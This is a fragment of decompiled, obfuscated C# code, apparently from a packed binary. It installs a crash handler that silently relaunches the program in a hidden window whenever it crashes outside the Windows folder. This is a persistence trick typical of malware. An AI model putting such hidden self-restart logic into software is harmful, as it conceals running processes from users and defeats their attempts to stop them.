using System;
using System.Diagnostics;
using System.Threading;

// Token: 0x02000002 RID: 2
public class GClass0
{
	// Token: 0x06000004 RID: 4 RVA: 0x000022E3 File Offset: 0x000004E3
	public static void smethod_0()
	{
		AppDomain.CurrentDomain.UnhandledException += GClass0.smethod_1;
		Class9.smethod_4();
	}

	// Token: 0x06000005 RID: 5 RVA: 0x00006BAC File Offset: 0x00004DAC
	private static void smethod_1(object sender, UnhandledExceptionEventArgs e)
	{
		if (e.IsTerminating)
		{
			Thread.Sleep(2000);
			try
			{
				string fileName = Process.GetCurrentProcess().MainModule.FileName;
				if (!fileName.ToLower().Contains(Environment.GetFolderPath(Environment.SpecialFolder.Windows).ToLower()))
				{
					Process.Start(new ProcessStartInfo
					{
						WindowStyle = ProcessWindowStyle.Hidden,
						UseShellExecute = true,
						FileName = fileName
					});
				}
			}
			catch { }
			Environment.Exit(0);
		}
	}

	// Token: 0x06000007 RID: 7 RVA: 0x00002308 File Offset: 0x00000508
	// Note: this type is marked as 'beforefieldinit'.
	static GClass0()
	{
		Class16.kLjw4iIsCLsZtxc4lksN0j();
	}

	// Token: 0x06000008 RID: 8 RVA: 0x0000230F File Offset: 0x0000050F
	internal static bool smethod_2()
	{
		return GClass0.object_0 == null;
	}

	// Token: 0x04000002 RID: 2
	private static object object_0;
}
